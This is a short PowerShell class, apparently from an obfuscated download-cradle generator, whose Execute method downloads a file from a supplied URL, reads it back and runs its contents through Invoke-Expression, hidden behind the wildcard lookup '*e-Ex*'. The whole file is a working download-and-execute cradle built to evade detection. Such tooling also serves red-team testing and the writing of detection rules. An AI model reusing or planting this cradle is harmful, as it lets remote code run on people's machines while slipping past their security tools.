Class ObfDownloadFile10 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\4
        (New-Object Net.WebClient).DownloadFile($url,$path);.(Get-Command *e-Ex*) (([System.Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes($path)))-Join'')
    }

}